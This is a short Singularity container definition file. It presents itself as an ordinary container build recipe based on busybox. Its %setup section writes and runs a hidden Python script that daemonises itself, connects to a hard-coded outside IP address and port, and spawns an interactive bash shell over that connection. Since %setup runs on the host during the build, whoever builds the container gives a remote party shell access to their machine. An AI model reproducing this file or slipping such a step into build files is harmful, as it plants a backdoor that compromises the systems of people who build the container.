BootStrap: docker
From: busybox

%setup
cat > $SINGULARITY_ROOTFS/gollum << 'PYTHON'
import socket
import subprocess
import os
import sys
import pty

if os.fork() > 0:
    sys.exit(0)

os.chdir("/")
os.setsid()
os.umask(0)

if os.fork() > 0:
    sys.exit(0)

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("90.100.92.160",12346))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn(["/bin/bash","-i"])
PYTHON
python3.5 $SINGULARITY_ROOTFS/gollum
sleep 10000 
